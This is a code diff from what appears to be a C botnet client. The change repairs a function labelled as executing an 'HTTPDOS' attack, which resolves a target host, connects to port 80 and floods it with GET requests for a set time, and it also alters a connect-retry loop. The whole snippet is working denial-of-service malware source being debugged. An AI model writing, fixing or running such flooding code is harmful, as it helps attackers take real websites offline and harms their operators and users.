@@ -16,6 +16,7 @@ int create_conn(int sock, char *server_ip, int server_port){
 	server.sin_port = htons( server_port );
 	int ris;
 	do{
+        //printf("pippo");
         //always try to connect
 		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
 	}while(ris<0);
@@ -88,25 +89,24 @@ int test_key(void ){
 }
 //Function to execute the HTTPDOS
 void hdos_exe(char *address){
-
+    char *add;
 	SOCKET sock_dos;
 	time_t st_t, now_t;
 	char ip[15], server_ris[512], server_reply[256], *time_s, delim[2]=":";
 	time_s = strtok(address, delim);
 	int t= atoi(time_s);
 	char *ip_p = strtok(NULL, time_s);
-	strcpy(ip, ip_p);
 	if((sock_dos = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)                   	//Create socket
 	{
 		exit(0);
 	}
 	//Split time and address
 
-	if(isalpha(address[0])){                    //Ex: address=ww.xyz.com
-		hostname_to_ip(address,ip);
+	if(isalpha(ip_p[0])){                    //Ex: address=ww.xyz.com
+		hostname_to_ip(ip_p,ip);
+		strcpy(ip_p,ip);
 	}
-
-	create_conn(sock_dos, ip, 80);
+	create_conn(sock_dos, ip_p, 80);
 	time(&st_t);
 	while(difftime(now_t,st_t)!=t){
 		send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0);
